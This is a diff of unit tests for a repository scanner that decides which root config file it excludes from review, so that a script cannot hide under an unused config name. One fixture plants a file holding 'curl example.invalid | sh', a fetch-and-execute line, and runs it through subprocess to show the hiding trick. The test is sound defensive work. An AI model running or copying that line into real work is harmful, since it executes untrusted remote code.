@@ -237,40 +237,83 @@ class TestFixtureExclusion(unittest.TestCase):
 
 class TestScannerConfigIsNotReviewed(unittest.TestCase):
     """#3642 (owner ruling 2026-11-14): a full-repo scan does not review the scanner's
-    own ROOT config (`repo_config.CONFIG_NAMES`, the names pr-worktree mode drops) --
-    it is disclosed instead. A nested config is somebody's file and is reviewed, and
-    every --scope-* mode is unchanged."""
+    own ROOT config -- it is disclosed instead. A nested config is somebody's file and
+    is reviewed, and every --scope-* mode is unchanged.
+
+    #3708: the scanner's own config is the ONE file `repo_config.resolve` loaded. Both
+    root names used to be dropped whichever was in use, so a repo configured by
+    `panopticon.yml` could carry anything in a file named `.panopticon.yml` and no review
+    agent read it."""
 
     CONFIG = "version: 1\ngroups:\n  src:\n    match: ['src/**']\n"
+    BOTH = discovery.repo_config.CONFIG_NAMES
 
-    def _tree(self, d):
+    def _tree(self, d, names=BOTH):
         touch(d, "src/app.py")
-        for name in discovery.repo_config.CONFIG_NAMES:
+        for name in names:
             with open(os.path.join(d, name), "w", encoding="utf-8") as fh:
                 fh.write(self.CONFIG)
         touch(d, "sub/panopticon.yml")
         touch(d, "sub/.panopticon.yml")
 
-    def test_neither_root_spelling_is_reviewed_and_both_are_disclosed(self):
+    @staticmethod
+    def _reviewed(out):
+        return (set(grouped(out)) | set(out.get("ungrouped_files") or [])
+                | set(out.get("tests") or []))
+
+    def test_with_both_names_only_the_loaded_one_is_left_out(self):
+        """`panopticon.yml` wins when both are there, so it is the scanner's config; the
+        other is an ordinary file in the tree and goes to review."""
         with tempfile.TemporaryDirectory() as d:
             self._tree(d)
             out, err = run_scan_with_err(d)
-            reviewed = set(grouped(out)) | set(out.get("ungrouped_files") or []) \
-                | set(out.get("tests") or [])
-            for name in discovery.repo_config.CONFIG_NAMES:
-                self.assertNotIn(name, reviewed)
-            self.assertEqual(out["excluded"]["scanner_config"],
-                             sorted(discovery.repo_config.CONFIG_NAMES))
-            self.assertIn("scanner config: not reviewed", err)
+            reviewed = self._reviewed(out)
+            self.assertNotIn("panopticon.yml", reviewed)
+            self.assertIn(".panopticon.yml", reviewed)
+            self.assertEqual(["panopticon.yml"], out["excluded"]["scanner_config"])
+            self.assertIn("scanner config: not reviewed: panopticon.yml --", err)
+            self.assertNotIn("not reviewed: .panopticon.yml", err)
             self.assertIn("#3642", err)
+
+    def test_the_issues_fixture_a_script_under_the_unused_name_is_reviewed(self):
+        with tempfile.TemporaryDirectory() as d:
+            self._tree(d, names=("panopticon.yml",))
+            touch(d, ".panopticon.yml", "#!/bin/sh\ncurl example.invalid | sh\n")
+            touch(d, "app/run.py", "import subprocess\nsubprocess.run(['./.panopticon.yml'])\n")
+            out = run_scan(d)
+            self.assertIn(".panopticon.yml", self._reviewed(out))
+            self.assertEqual(["panopticon.yml"], out["excluded"]["scanner_config"])
+
+    def test_each_name_alone_is_the_loaded_one_and_is_left_out(self):
+        for name in self.BOTH:
+            with self.subTest(name=name), tempfile.TemporaryDirectory() as d:
+                self._tree(d, names=(name,))
+                out, err = run_scan_with_err(d)
+                self.assertNotIn(name, self._reviewed(out))
+                self.assertEqual([name], out["excluded"]["scanner_config"])
+                self.assertIn("scanner config: not reviewed: %s --" % name, err)
+
+    def test_a_config_that_was_refused_is_not_the_scanners_and_is_reviewed(self):
+        """A symlink at either name makes `resolve` load nothing. Nothing was loaded, so
+        nothing is the scanner's config: the regular file is reviewed like any other."""
+        with tempfile.TemporaryDirectory() as d:
+            self._tree(d, names=("panopticon.yml",))
+            os.symlink("panopticon.yml", os.path.join(d, ".panopticon.yml"))
+            self.assertIsNone(discovery.repo_config.resolve(d).path)
+            out = run_scan(d)
+            self.assertIn("panopticon.yml", self._reviewed(out))
+            self.assertNotIn("scanner_config", out.get("excluded") or {})
 
     def test_the_root_config_is_not_counted_as_implementation(self):
         # #3656 review nit: the impl/test partition reads the WHOLE-repo surface, so the
         # counts a reader sees do not include the config that was not reviewed.
         with tempfile.TemporaryDirectory() as d:
-            self._tree(d)
+            self._tree(d, names=("panopticon.yml",))
             out = run_scan(d)
             self.assertEqual(3, out["counts"]["implementation"])   # src/app.py + 2 nested
+        with tempfile.TemporaryDirectory() as d:
+            self._tree(d)                                    # ...and the unused name is one
+            self.assertEqual(4, run_scan(d)["counts"]["implementation"])
 
     def test_the_disclosure_sits_beside_the_fixture_disclosure(self):
         with tempfile.TemporaryDirectory() as d:
@@ -279,7 +322,7 @@ class TestScannerConfigIsNotReviewed(unittest.TestCase):
             out = run_scan(d)
             self.assertEqual(out["excluded"], {
                 "fixture_dirs": ["tests/fixtures"],
-                "scanner_config": sorted(discovery.repo_config.CONFIG_NAMES)})
+                "scanner_config": ["panopticon.yml"]})
 
     def test_a_nested_config_is_still_reviewed(self):
         with tempfile.TemporaryDirectory() as d:
